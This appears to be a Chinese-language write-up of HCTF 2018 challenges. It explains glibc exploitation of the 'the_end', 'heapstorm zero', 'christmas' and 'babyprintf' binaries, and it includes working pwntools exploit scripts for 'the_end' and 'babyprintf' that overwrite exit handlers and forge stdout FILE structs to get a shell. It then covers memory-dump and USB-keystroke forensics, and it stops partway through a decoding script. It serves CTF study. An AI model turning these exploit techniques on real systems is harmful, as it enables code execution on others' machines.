## Pwn

```
// file
the_end: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4a46a73f8c01b2498d7bbc69dfbf585ab84b5625, not stripped

// checksec
[*] '/tmp/tmp/hctf2018/pwn-the_end/the_end'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程式流程很簡單，先給你 libc address，關閉 stdout、stderr 後，讓你寫 4 次任意位置，每次寫 1 個 bytes:

```c
 ...
  for ( i = 0; i <= 4; ++i )
  {
    read(0, &buf, 8uLL);
    read(0, buf, 1uLL);
  }
 ...
```

此題因為 Full Relro 的關係，不能做 link_map attack，因此要想其他方法，而在 `exit() -> __run_exit_handlers()` 執行時，在 `__run_exit_handlers()` 的最後會呼叫:

```c
 ...
  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());

  _exit (status);
 ...
```

預設 `run_list_atexit` 為 true，因此 `__libc_atexit` 會被執行到，而 `__libc_atexit` 放的是 `__elf_set___libc_atexit_element__IO_cleanup__`，`__elf_set___libc_atexit_element__IO_cleanup__` 又會指向 `_IO_cleanup` 來清除 IO，有趣的一點是，`__elf_set___libc_atexit_element__IO_cleanup__` 本身是可寫的，因此可以把 one_gadget 寫在這，

```python
#!/usr/bin/python3
                
from pwn import *
                
r = process("./the_end")
                
r.recvuntil('here is a gift ')
libc = int(r.recvuntil(', ', drop=True), 16) - 0xe5f40
__elf_set___libc_atexit_element__IO_cleanup__ = libc + 0x1ed608
info(f"libc: {hex(libc)}")
info(f"target: {hex(__elf_set___libc_atexit_element__IO_cleanup__)}")
                
ogs = [0xe6c7e, 0xe6c81, 0xe6c84]
og = libc + ogs[0]
input()         
for i in range(5):                                                                                                                                                           
    sleep(0.1)  
    r.send(p64(__elf_set___libc_atexit_element__IO_cleanup__ + i)) 
    sleep(0.1)  
    r.send(bytes([(og >> i*8) & 0xff]))
r.interactive()
```

而官方做法為使用 3 bytes partial overwrite `__realloc_hook` (原本為 `realloc_hook_ini`) 成 one gadget，再用剩下的 2 bytes 來蓋 vtable function 成 `realloc@got`，藉此跳到 `_realloc_hook` 指向的 address。

### heapstorm zero

這題環境在 glibc 2.23，由於已經滿舊的，所以只記錄 writeup 中重要的部分。

- `scanf()` 在 `_IONBF` 的情況下仍會 malloc 一塊 chunk 來存資料，差別在於使用後會馬上 `free()`
- 用 `malloc consolidate` 把 fastbin merge 成 unsorted bin 來 leak -> fastbin dup -> fd 在 main arena 留 size -> 拿到 main arena fastbin -> 改 top chunk 成 malloc_hook -> one gadget

### christmas

```
// file christmas
christmas: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=794fbcef5cd3a538eceb4af773088e003af8d562, not stripped

// checksec christmas
[*] '/tmp/tmp/hctf2018/pwn-Christmas/christmas'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
  
// file libflag.so
libflag.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=1308ee43c2b1721c5ed2c1aa146d5b53d736111e, not stripped

// checksec libflag.so
[*] '/tmp/tmp/hctf2018/pwn-Christmas/libflag.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

有加 seccomp，只能執行 `exit` 以及 `exit_group`:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0007
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

目標是 call `flag_yes_1337()` 的到 flag ptr，並且透過比對的方式找出來，而這邊 shellcode 有限制要字母以及數字 (`__ctype_b_loc() & 8 == 1`，而 `_ISalnum = _ISbit (11)        /* Alphanumeric.  */`，請參考 [ctype 介紹](https://stackoverflow.com/a/37712732))，可以使用工具 [alpha3](https://github.com/TaQini/alpha3) 幫忙產生 shellcode (`python3 alpha3/ALPHA3.py x64 ascii mixedcase RAX --input="payload" -v`)，執行 `python ./ALPHA3.py x64 ascii mixedcase <reg> --input="<input>"` 就會產生 alphanumeric shellcode。

TODO. an alphanumeric shellcode encoder

### baby printf ver2

```
// file
babyprintf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1096804b2b64ebbe4f376f20d92334aefee63c43, not stripped

// checksec
[*] '/tmp/tmp/hctf/2018/babyprintf/babyprintf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

環境為 Glibc 2.27，但是最原始 `FORTIFY_SOURCE` defeat 的文章環境為 Glibc 2.11。



`FORTIFY_SOURCE` 提供了兩種對策 handle fmt:

- Format strings containing the **%n specifier** may not be located at a **writeable address** in the memory space of the application
- When using positional parameters, all arguments within the range must be consumed. So to **use %7$x, you must also use 1,2,3,4,5 and 6**
- If the format string payload containing a **%n** is located in a **writeable memory** area (stack or BSS or DATA or the heap), this patch will detect it and error out

file stream flag:

```
#define _IO_FLAGS2_MMAP 1         //fopen 'm' mmap access mode
#define _IO_FLAGS2_NOTCANCEL 2    //open/read/write should not be used as
                                    thread cancellization points
#ifdef _LIBC
# define _IO_FLAGS2_FORTIFY 4     //enable fortify security checks
#endif
#define _IO_FLAGS2_USER_WBUF 8    //wide buffer (2-byte) support funk
#ifdef _LIBC
# define _IO_FLAGS2_SCANF_STD 16  // %a support for scanf
#endif
```

Protection 1 - `%n` 不該出現在 writable address (這樣 runtime 有可能被 inject):

```c
    LABEL (form_number):						      \
      if (s->_flags2 & _IO_FLAGS2_FORTIFY)				      \
	{								      \
	  if (! readonly_format)					      \
	    {								      \
	      extern int __readonly_area (const void *, size_t)		      \
		attribute_hidden;					      \
	      readonly_format						      \
		= __readonly_area (format, ((STR_LEN (format) + 1)	      \
					    * sizeof (CHAR_T)));	      \
	    }								      \
	  if (readonly_format < 0)					      \
	    __libc_fatal ("*** %n in writable segment detected ***\n");	      \
	}
```

Protection 2 - 若指定 offset 做為 argument (`%4$x`)，則前面 offset 都必須要使用到 (`%3$x %2$x %1$x`):

```c
args_type = alloca (nargs * sizeof (int));
memset (args_type, s->_flags2 & _IO_FLAGS2_FORTIFY ? '\xff' : '\0',
  nargs * sizeof (int));
args_value = alloca (nargs * sizeof (union printf_arg));
args_size = alloca (nargs * sizeof (int));
...
    
for (cnt = 0; cnt < nspecs; ++cnt)
{
    /* If the width is determined by an argument this is an int.  */
    if (specs[cnt].width_arg != -1)
      args_type[specs[cnt].width_arg] = PA_INT;

    /* If the precision is determined by an argument this is an int.  */
    if (specs[cnt].prec_arg != -1)
      args_type[specs[cnt].prec_arg] = PA_INT;

    switch (specs[cnt].ndata_args)
      {
      case 0:       /* No arguments.  */
        break;
      case 1:       /* One argument; we already have the
                   type and size.  */
        args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;
        args_size[specs[cnt].data_arg] = specs[cnt].size;
        break;
      default:
        /* We have more than one argument for this format spec.
           We must call the arginfo function again to determine
           all the types.  */
        (void) (*__printf_arginfo_table[specs[cnt].info.spec])
          (&specs[cnt].info,
           specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],
           &args_size[specs[cnt].data_arg]);
        break;
      }
}
...
for (cnt = 0; cnt < nargs; ++cnt)
    switch (args_type[cnt])
    {
    case -1:
    /* Error case.  Not all parameters appear in N$ format
       strings.  We have no way to determine their type.  */
      assert (s->_flags2 & _IO_FLAGS2_FORTIFY);
      __libc_fatal ("*** invalid %N$ use detected ***\n");
    }
```

參考 [bootlin vfprintf.c#1781](https://elixir.bootlin.com/glibc/glibc-2.27/source/stdio-common/vfprintf.c#L1781)。

首先會找出 argument 的最大值 `nargs = MAX (nargs, max_ref_arg);`，像是 fmt `%10$d %20$d %15$d` 中最大值就會是 20。之後會有一個 for loop，traverse 所有的 fmt unit，並將對應到的 type 存在 `args_type` 中，並在最後 traverse `args_type`，如果有一個為 -1，則代表沒有對應到的 fmt unit，不符合 Protection 2。

而 `args_type` 的 memory region 是用 `alloca()` create 出來的 (比較新的版本不再使用 `alloca()` )，`alloca()` 會動態調整 rsp 來分配空間，而 `alloca()` 會因為給的 size 超過 stack 大小而出現 undefined behavior。 x86 可以利用 integer overflow 讓 `alloca()` 時不會超過 stack size。

當 fmt unit 如 `%2$*123$x` 時，根據fmt 對  `*` 的解釋: 如果域寬值為`*`，則由對應的函式參數的值為當前域寬，像是 `printf("%*d", 5, 10)`輸出"`  10`"。而在 `printf` 內部型態會被當作是  INT `args_type[specs[cnt].width_arg] = PA_INT;`，這樣就可以對某個目標寫 0 了。

總結:

- 用 integer overflow 讓 `alloca()` 不超過 stack size
- `stdout->_flag2` 寫 0，disable `FORTIFY_SOURCE`
  - `nargs` 寫 0，disable `%N$` 檢查

而這個攻擊手法在 glibc 2.23 被 patch 了，在新的版本中也用 `nargs = MAX (nargs, max_ref_arg);` 來限制 `nargs` 的上限。



- [phrack 文章](http://phrack.org/issues/67/9.html)



---



這題的 bypass `FORTIFY_SOURCE` (`printf_chk`) 的方法有兩種:

- `printf("%a")`:
  - `%a`: `double`型的16進位表示
- fake stdout:
  - 用 `_IO_write_ptr` + `_IO_write_end` 去改寫 `stdout._flags2`
  - FILE `_flags` 的前兩個 bytes 固定為 `0xfbad`

- Load gdb debug symbol: `dir /usr/src/glibc/glibc-2.27/debug/:/usr/src/glibc/glibc-2.27/stdio-common/:/usr/src/glibc/glibc-2.27/libio`



`vfprintf()` 有一段程式碼如下:

```c
...
outstring ((const UCHAR_T *) format,
	lead_str_end - (const UCHAR_T *) format);
...
```

`outstring()` macro 展開後:

```c
#define outstring(String, Len)						      \
  do									      \
    {									      \
      assert ((size_t) done <= (size_t) INT_MAX);			      \
      if ((size_t) PUT (s, (String), (Len)) != (size_t) (Len))		      \
	{								      \
	  done = -1;							      \
	  goto all_done;						      \
	}								      \
      if (__glibc_unlikely (INT_MAX - done < (Len)))			      \
      {									      \
	done = -1;							      \
	 __set_errno (EOVERFLOW);					      \
	goto all_done;							      \
      }									      \
      done += (Len);							      \
    }									      \
  while (0)
```

而 `PUT()` 為:

```c
# define PUT(F, S, N)	_IO_sputn ((F), (S), (N))
```

實際上是 call `_IO_new_file_xsputn()`，傳入的 `data` 與 `n` 分別為 format string 的起頭以及起頭的 offset，所以 `vfprintf()` 會在 fmt 之前把前面的 string 印出。而在 `_IO_new_file_xsputn()` 中，會有幾個比較:

```c
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
	...
else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr;
```

這裡必須控制 `f->_IO_write_end > f->_IO_write_ptr`，指向要寫入的開頭 + 結尾。

最後在 `__mempcpy (f->_IO_write_ptr, s, count);` 會把 xxxx 寫到 `_flag2`。後來的 `if (to_do + must_flush > 0)` condition 會不過而直接 `return n - to_do;`。

`vfprintf -> printf_positional -> _IO_new_file_xsputn -> new_do_write`:

```c
// printf_positional
// /stdio-common/vfprintf.c

	  JUMP (spec, step4_jumps);

	  process_arg ((&specs[nspecs_done]));
	  process_string_arg ((&specs[nspecs_done]));
```

仍須滿足  `read_end` == `write_base`:

```c
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do); // <-- target
```

`printf_positional` 會先把 `0x` 寫到 buffer，再把數字 (address) 寫到 buffer，而在第二次寫數字時，此時 buffer 為 `xxxx0x`，`_IO_OVERFLOW (f, EOF)` 會把 buffer flush (buffer 已經滿了)，`if (do_write)` 通過，執行 `count = new_do_write (f, s, do_write);` 直接印出剩下的 number。總結原理為 `xxxx0x` 會把 buffer 占滿，所以 `overflow` 會希望先 flush，不過因為 `buf_base` 以及 `buf_end` 為 0，所以不會印出來，而當印完後，因為還有剩下的資料，就直接透過 `write` 將剩下的資料印出，所以 stdout 就接的到剩下的數字 (address)。

之後 leak stack 以及 tls，leak 出 tls 的目的為修改 vtable 為自訂的 table，並透過原本的 `_IO_PUTS_(fd)` 來執行 `system("\xfb\xad...;sh\x00")`，而要自定義 vtable，還並須 bypass `_IO_vtable_check`， 首先取出 `IO_accept_foreign_vtables`，如果 demangle 完之後得到 `_IO_vtable_check` address，則通過檢查:

```c
void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables); // 把 IO_accept_foreign_vtables 的值取出
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag); // ror 0x11 + xor rax, qword ptr fs:[0x30]
#endif
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (!rtld_active ()
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```

其中 mangle / demangle 所做的分別是 encrypt / decrypt variable，專有名詞為 [Pointer Encryption](https://sourceware.org/glibc/wiki/PointerEncryption) (pointer mangling or pointer guard):

```c
// xor rax, qword ptr fs:[0x30] + rol 0x11
#  define PTR_MANGLE(var)	asm ("xor %%fs:%c2, %0\n"		      \
				     "rol $2*" LP_SIZE "+1, %0"		      \
				     : "=r" (var)			      \
				     : "0" (var),			      \
				       "i" (offsetof (tcbhead_t,	      \
						      pointer_guard)))

// ror 0x11 + xor rax, qword ptr fs:[0x30]
#  define PTR_DEMANGLE(var)	asm ("ror $2*" LP_SIZE "+1, %0\n"	      \
				     "xor %%fs:%c2, %0"			      \
				     : "=r" (var)			      \
				     : "0" (var),			      \
				       "i" (offsetof (tcbhead_t,	      \
						      pointer_guard)))
```

canary 為 fs+0x28，而 guard 在 canary 下方 (`fs:[0x30]`)，為隨機數。Struct 以及 macro:

```c
typedef struct
{
  dtv_t *dtv;
  uintptr_t pointer_guard;
} tcbhead_t;

#define THREAD_SET_POINTER_GUARD(value)
#define THREAD_COPY_POINTER_GUARD(descr)
```

所以要控制 `PTR_DEMANGLE` 的符合我們預期，則需要 leak 出 guard 或是改寫 guard，因此才會需要 tls address。最後 exploit 如下:

```python
from pwn import *

r = process('./B', env={"LD_PRELOAD": "./libc-2.27.so"})
r.recvuntil('location to ')
buf = int(r.recvline()[:-1], 16)
info(f'buf: {hex(buf)}')

# data = buf-0x10
#### fake stdout FILE struct
#### use vfprintf -> _IO_new_file_xsputn to overwrite flags2
r.recvuntil('!\n')
stdout_offset = buf + 0x100
fake_stdout = p64(0xfbad2284 | 0x8000) # 0x8000 _IO_USER_LOCK
fake_stdout += p64(0)*3 # read ptr, end, base
fake_stdout += p64(stdout_offset + 0x74) # write base, avoid allocate
fake_stdout += p64(stdout_offset + 0x74) # write ptr
fake_stdout += p64(stdout_offset + 0x74 + 6) # write end
# _IO_write_ptr == _IO_write_end
# must > 6 ==> xxxx0x
fake_stdout = fake_stdout.ljust(0x70, b'\x00')
fake_stdout += p32(1) # fileno
fake_stdout = fake_stdout.ljust(0xd8, b'\x00')


##### leak libc
fmt = b"xxxx%72$p"
payload = fmt.ljust(0x10, b'\x00') + p64(stdout_offset)
payload = payload.ljust(0x100, b'\x00')
payload += fake_stdout
r.sendline(payload)
r.recvuntil('\n')
libc = int(r.recv(12), 16) - 0x21b97
info(f'libc: {hex(libc)}')
binsh = libc + 0x1B3E9A
_system = libc + 0x4f440

##### leak stack
fmt = b"xxxx%74$p"
payload = fmt.ljust(0x10, b'\x00') + p64(stdout_offset)
payload = payload.ljust(0x100, b'\x00')
payload += fake_stdout
r.sendline(payload)
r.recvuntil('\n')
stack = int(r.recv(12), 16)
info(f'stack: {hex(stack)}')

io_check = 0x8A150
def write_to(addr, val):
    fmt = val
    fake_stdout = p64(0xfbad2284 | 0x8000)
    fake_stdout += p64(0)*3 # read ptr, end, base
    fake_stdout += p64(addr)*2 # write base, ptr
    fake_stdout += p64(addr + 8) # write end
    fake_stdout = fake_stdout.ljust(0x70, b'\x00')
    fake_stdout += p32(1)
    fake_stdout = fake_stdout.ljust(0xd8, b'\x00')
    payload = fmt.ljust(0x10, b'\x00')+p64(stdout_offset)
    payload = payload.ljust(0x100, b'\x00')
    payload += fake_stdout
    r.sendline(payload)
    r.recvuntil('\n')

def rol(x,off):
    return ((x << off) | (x >> (64-off))) & 0xffffffffffffffff

##### leak tls from (libc + 0x3EB008 + 1)
write_to(stack, p64(libc + 0x3EB008 + 1))
fmt = b"xxxxxx%%%d$s" % (74 + 0xd0/8)
payload = fmt.ljust(0x10, b'\x00') + p64(stdout_offset)
payload = payload.ljust(0x100, b'\x00')
payload += fake_stdout
r.sendline(payload)
r.recvuntil('\n')
tls = u64(b'\x00' + r.recv(5) + b'\x00\x00')
info(f'tls: {hex(tls)}')

IO_accept_foreign_vtables = libc + 0x3F0668
write_to(tls + 0x15b0, b'a'*8)
write_to(IO_accept_foreign_vtables, p64(rol((libc + 0x8A150) ^ int((b'a'*8).hex(), 16), 17)))
fmt = p64(stdout_offset + 0xd8)[:-2] + b'aa' # overwrite vtable
fake_stdout = p32(0xfbad2284 | 0x8000) + b';sh\x00'
fake_stdout += p64(0)*3
fake_stdout += p64(stdout_offset+0xd8)*2
fake_stdout += p64(stdout_offset+0xd8 + 6)
fake_stdout = fake_stdout.ljust(112, b'\x00')
fake_stdout += p32(1)
fake_stdout = fake_stdout.ljust(0xd8, b'\x00')
payload = fmt.ljust(0x10, b'\x00')+ p64(stdout_offset)
payload = payload.ljust(0x100, b'\x00')
payload += fake_stdout # vtable
payload += p64(_system)*4 # vtable
r.sendline(payload)
r.recvuntil('\n')
r.interactive()
```

- glibc 的 `_GLOBAL_OFFSET_TABLE_` (GOT) 在 2.27 版時，0x8 offset 的位置會有 tls 的 address，而 2.31 會處在 tls memory region 之中
  - 也可以使用 `(gdb) search -8 <tls_addr>` 來找哪裡會有 tls address
- pointer encryption guard
  - 由 dynamic linker 初始化，如果 binary 是 static 則在 startup code
  - 存在 TCB ([TCB vs. TLS](https://stackoverflow.com/a/62518904))



---



[其他解法](https://petircysec.com/hctf-2018-babyprintf/)

`printf` flow:

- `__printf_chk(1, global_buffer, 0xdeadbeef)`
- `vfprintf(stdout, global_buffer, args)`
- `_IO_default_xsputn(stdout, global_buffer, len)`
- `_IO_new_file_overflow（stdin, -1）`
- `_IO_new_file_write(stdout, global_buffer, len)`
- `_IO_new_do_write(stdout, global_buffer, len)`
- `write（stdin->_fileno, global_buffer, len）`

當在 `printf` 時，滿足:

- `if ((f->_flags & _IO_CURRENTLY_PUTTING) != 0`
- `f->_IO_write_base != NULL`

就能直接執行 `_IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base);`，不會像上個解法一樣清空 write pointer。

而在 `_IO_new_do_write -> new_do_write` 當中，須滿足:

- `fp->_IO_read_end == fp->_IO_write_base` (不然會做 seek，更改到 ptr 的位置)
- `(fp->_flags & _IO_IS_APPENDING) == 0`

`write_ptr` 設為 target + size，`write_base` 設為 target ，就能 leak memory。

再任意讀之後，要透過 `_IO_default_xsputn` 內的 `__mempcpy (f->_IO_write_ptr, s, count);` 來做任意寫入。當 `f->_IO_write_end - f->_IO_write_ptr`，`_IO_default_xsputn` 會認為 destination 的資料可以先存到 buffer 裡面，而此時控制 `write_ptr` 指向 `__malloc_hook`，以及 input 一開始寫入 one gadget，就能寫 one gadget 到 `__malloc_hook`，最後再透過 `printf()` 來 trigger `malloc()`:

```c
// /stdio-common/vfprintf.c
#define CHAR_T		char
#define EXTSIZ		32
enum { WORK_BUFFER_SIZE = 1000 / sizeof (CHAR_T) };
...
	if (width >= WORK_BUFFER_SIZE - EXTSIZ)
	  {
	    /* We have to use a special buffer.  */
	    size_t needed = ((size_t) width + EXTSIZ) * sizeof (CHAR_T);
	    if (__libc_use_alloca (needed))
	      workend = (CHAR_T *) alloca (needed) + width + EXTSIZ;
	    else
	      {
		workstart = (CHAR_T *) malloc (needed);
		if (workstart == NULL)
		  {
		    done = -1;
		    goto all_done;
		  }
		workend = workstart + width + EXTSIZ;
	      }
	  }

// 
// /sysdeps/generic/allocalim.h
extern inline int __libc_use_alloca (size_t size)
{
  return size <= __MAX_ALLOCA_CUTOFF;
}

// /include/alloca.h
#define __MAX_ALLOCA_CUTOFF	65536
```

只要印出超過 65536 的 char 就能夠 trigger `malloc()`，不然 `vfprintf` 會直接用 `alloca` 來取得需要的 memory region。



## Misc

### easy dump

unzip，稍微用 strings 看一下，可以知道是 memory dump，這邊紀錄一下 data 特徵:

```
...
(0.1.2.3.4.5)()
IgnoreIsaVgaBitConflict = \
    %BasicMachineID(0.1.0.2.3.0.4.0.5.0.6)(0.1.2.3.4.5)()
; ACPI AMLI-specific rules
AMLIReturn_REV1 = \
    %BasicMachineID(0.1.0.2.3.0.4.0.5.0.6)(0.1.2.3.4.5)()
AMLIReturn_REV3 = \
    %BasicMachineID(0.1.0.2.3.0.4.0.5.0.6)(0.1.2.3.4.5)()
AMLIIgnorePackageLengthCheck = \
    %BasicMachineID(0.1.0.2.3.0.4.0.5.0.6)(0.1.2.3.4.5)()
AMLIAllowInvalidReclaimMemoryMapOnLoad = \
    %BasicMachineID(0.1.0.2.3.0.4.0.5.0.6)(0.1.2.3.4.5)()
AMLIAllowInvalidReclaimMemoryMapOnEval = \
    ?AcpiObjectName()(0)(0),?CpuType(0.1.2.3)(1.2.3.4),&
...
```

之後查看 imageinfo `volatility -f mem.data imageinfo`，知道是 `Win7SP1x64`，之後分別用 `filescan`、`pstree`、`cmdline` 觀察是否有可疑的地方。

- 使用者名稱: `veritas501`
- 開啟程式
  - `MineSweeper.exe`: 踩地雷 (pid 312)
  - `mspaint.exe`: 小畫家 (pid 2768)
    - `filescan` 可能會有 png, jpeg, jpg 等等檔案
  - `wordpad.exe`: windows 文件程式 (pid 1804)
    - `filescan` 可能會有 doc, docx 等等檔案

GIMP 可以吃 raw data，因此可以把小畫家的 `memdump` 丟進去看，GIMP 中 image type 選 `raw image data`，最後調到 (offset, width, height) 為 (`147577243`,  `1457`, `2000`) 即可看到 flag。

- height 不用變
- offset 用來調整左右位移
- width 用來表現 display resolution

### difficult programming language

`tshark -r ./difficult_programming_language.pcap -T fields -e usb.capdata > data` 將 usb data extract 出來，之後參考[這篇文章](https://abawazeeer.medium.com/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)分析 data。只要了解了 usb packet 格式，就只要寫腳本轉成輸入的字串即可:

```python
#!/usr/bin/python3

keymap = {
	0x00: {"normal": "", "shift": "", "ctrl": ""},
	0x01: {"normal": "", "shift": "", "ctrl": ""},
	0x04: {"normal": "a", "shift": "A", "ctrl": ""},
	0x05: {"normal": "b", "shift": "B", "ctrl": ""},
	0x06: {"normal": "c", "shift": "C", "ctrl": ""},
	0x07: {"normal": "d", "shift": "D", "ctrl": ""},
	0x08: {"normal": "e", "shift": "E", "ctrl": ""},
	0x09: {"normal": "f", "shift": "F", "ctrl": ""},
	0x0a: {"normal": "g", "shift": "G", "ctrl": ""},
	0x0b: {"normal": "h", "shift": "H", "ctrl": ""},
	0x0c: {"normal": "i", "shift": "I", "ctrl": ""},
	0x0d: {"normal": "j", "shift": "J", "ctrl": ""},
	0x0e: {"normal": "k", "shift": "K", "ctrl": ""},
	0x0f: {"normal": "l", "shift": "L", "ctrl": ""},
	0x10: {"normal": "m", "shift": "M", "ctrl": ""},
	0x11: {"normal": "n", "shift": "N", "ctrl": ""},
	0x12: {"normal": "o", "shift": "O", "ctrl": ""},
	0x13: {"normal": "p", "shift": "P", "ctrl": ""},
	0x14: {"normal": "q", "shift": "Q", "ctrl": ""},
	0x15: {"normal": "r", "shift": "R", "ctrl": ""},
	0x16: {"normal": "s", "shift": "S", "ctrl": ""},
	0x17: {"normal": "t", "shift": "T", "ctrl": ""},
	0x18: {"normal": "u", "shift": "U", "ctrl": ""},
	0x19: {"normal": "v", "shift": "V", "ctrl": ""},
	0x1a: {"normal": "w", "shift": "W", "ctrl": ""},
	0x1b: {"normal": "x", "shift": "X", "ctrl": ""},
	0x1c: {"normal": "y", "shift": "Y", "ctrl": ""},
	0x1d: {"normal": "z", "shift": "Z", "ctrl": ""},
	0x1e: {"normal": "1", "shift": "!", "ctrl": ""},
	0x1f: {"normal": "2", "shift": "@", "ctrl": ""},
	0x20: {"normal": "3", "shift": "#", "ctrl": ""},
	0x21: {"normal": "4", "shift": "$", "ctrl": ""},
	0x22: {"normal": "5", "shift": "%", "ctrl": ""},
	0x23: {"normal": "6", "shift": "^", "ctrl": ""},
	0x24: {"normal": "7", "shift": "&", "ctrl": ""},
	0x25: {"normal": "8", "shift": "*", "ctrl": ""},
	0x26: {"normal": "9", "shift": "(", "ctrl": ""},
	0x27: {"normal": "0", "shift": ")", "ctrl": ""},
	0x28: {"normal": "", "shift": "", "ctrl": ""},
	0x29: {"normal": "", "shift": "", "ctrl": ""},
	0x2a: {"normal": "", "shift": "", "ctrl": ""},
	0x2b: {"normal": "\t", "shift": "", "ctrl": ""},
	0x2c: {"normal": " ", "shift": "", "ctrl": ""},
	0x2d: {"normal": "-", "shift": "_", "ctrl": ""},
	0x2e: {"normal": "=", "shift": "+", "ctrl": ""},
	0x2f: {"normal": "[", "shift": "{", "ctrl": ""},
	0x30: {"normal": "]", "shift": "}", "ctrl": ""},
	0x31: {"normal": "\\", "shift": "|", "ctrl": ""},
	0x32: {"normal": "#", "shift": "~", "ctrl": ""},
	0x33: {"normal": ";", "shift": ":", "ctrl": ""},
	0x34: {"normal": "'", "shift": "\"", "ctrl": ""},
	0x35: {"normal": "`", "shift": "~", "ctrl": ""},
	0x36: {"normal": ",", "shift": "<", "ctrl": ""},
	0x37: {"normal": ".", "shift": ">", "ctrl": ""},
	0x38: {"normal": "/", "shift": "?", "ctrl": ""},
	0x39: {"normal": "", "shift": "", "ctrl": ""},
	0x3a: {"normal": "", "shift": "", "ctrl": ""},
	0x3b: {"normal": "", "shift": "", "ctrl": ""},
	0x3c: {"normal": "", "shift": "", "ctrl": ""},
	0x3d: {"normal": "", "shift": "", "ctrl": ""},
	0x3e: {"normal": "", "shift": "", "ctrl": ""},
	0x3f: {"normal": "", "shift": "", "ctrl": ""},
	0x40: {"normal": "", "shift": "", "ctrl": ""},
	0x41: {"normal": "", "shift": "", "ctrl": ""},
	0x42: {"normal": "", "shift": "", "ctrl": ""},
	0x43: {"normal": "", "shift": "", "ctrl": ""},
	0x44: {"normal": "", "shift": "", "ctrl": ""},
	0x45: {"normal": "", "shift": "", "ctrl": ""},
	0x46: {"normal": "", "shift": "", "ctrl": ""},
	0x47: {"normal": "", "shift": "", "ctrl": ""},
	0x48: {"normal": "", "shift": "", "ctrl": ""},
	0x49: {"normal": "", "shift": "", "ctrl": ""},
	0x4a: {"normal": "", "shift": "", "ctrl": ""},
	0x4b: {"normal": "", "shift": "", "ctrl": ""},
	0x4c: {"normal": "", "shift": "", "ctrl": ""},
	0x4d: {"normal": "", "shift": "", "ctrl": ""},
	0x4e: {"normal": "", "shift": "", "ctrl": ""},
	0x4f: {"normal": "", "shift": "", "ctrl": ""},
	0x50: {"normal": "", "shift": "", "ctrl": ""},
	0x51: {"normal": "", "shift": "", "ctrl": ""},
	0x52: {"normal": "", "shift": "", "ctrl": ""},
	0x53: {"normal": "", "shift": "", "ctrl": ""},
	0x54: {"normal": "/", "shift": "", "ctrl": ""},
	0x55: {"normal": "*", "shift": "", "ctrl": ""},
	0x56: {"normal": "-", "shift": "", "ctrl": ""},
	0x57: {"normal": "+", "shift": "", "ctrl": ""},
	0x58: {"normal": "", "shift": "", "ctrl": ""},
	0x59: {"normal": "1", "shift": "", "ctrl": ""},
	0x5a: {"normal": "2", "shift": "", "ctrl": ""},
	0x5b: {"normal": "3", "shift": "", "ctrl": ""},
	0x5c: {"normal": "4", "shift": "", "ctrl": ""},
	0x5d: {"normal": "5", "shift": "", "ctrl": ""},
	0x5e: {"normal": "6", "shift": "", "ctrl": ""},
	0x5f: {"normal": "7", "shift": "", "ctrl": ""},
	0x60: {"normal": "8", "shift": "", "ctrl": ""},
	0x61: {"normal": "9", "shift": "", "ctrl": ""},
	0x62: {"normal": "0", "shift": "", "ctrl": ""},
	0x63: {"normal": ".", "shift": "", "ctrl": ""},
}

capdatas = open("data", "r").read().split('\n')[:-1]

